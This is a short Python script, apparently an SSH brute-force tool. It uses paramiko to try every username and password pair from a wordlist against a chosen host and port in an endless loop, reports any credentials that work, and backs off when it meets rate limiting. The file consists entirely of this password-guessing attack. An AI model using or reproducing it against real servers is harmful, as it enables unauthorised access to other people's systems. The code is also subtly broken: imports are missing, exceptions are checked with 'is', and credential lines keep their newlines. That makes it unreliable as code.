from os import path
import paramiko

def connect(host, user, password, port):
    runs = 0
    try:
        s = paramiko.SSHClient()
        s.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        s.connect(host, username=user,password=password,port=port,timeout=10)
        print(f"Correct Credentials: {user}:{password}")
        exinput = input("Exit [y]/[n]?")
        if exinput.lower() == 'y':
            exit()
        else:
            pass
    except Exception as e:
        runs += 1
        if e is paramiko.ssh_exception.AuthenticationException:
            print("Authentication error, wrong credentials likely.")
        elif e is paramiko.ssh_exception.BadAuthenticationType:
            print("Key required.")
            exit()
        elif e is EOFError:
            print(str(e))
            print("Rate limiting...")
            sleep(randint(60, 120))
        else:
            print("Error as: "+str(e))

        if runs % 5 is 0:
            print("Resting...")
            sleep(5)

def ssh_force():
    port = int(input("Enter the port number: "))
    host = str(input("Enter the host: "))
    
    while True:
        credpath = input("Enter the full path of the credential file (should be structured with one term per line, no comma): ")
        if path.isfile(credpath) is True:
            break
        else:
            print("File not found")
            continue
    ulist = []
    plist = []
    with open(credpath, 'r') as credfile:
        for line in credfile:
            ulist.append(line)
            plist.append(line)
        while True:
            for u in ulist:
                for p in plist:
                    try:
                        connect(host=host,user=u,password=p,port=port)
                    except Exception as E:
                        print(str(E))
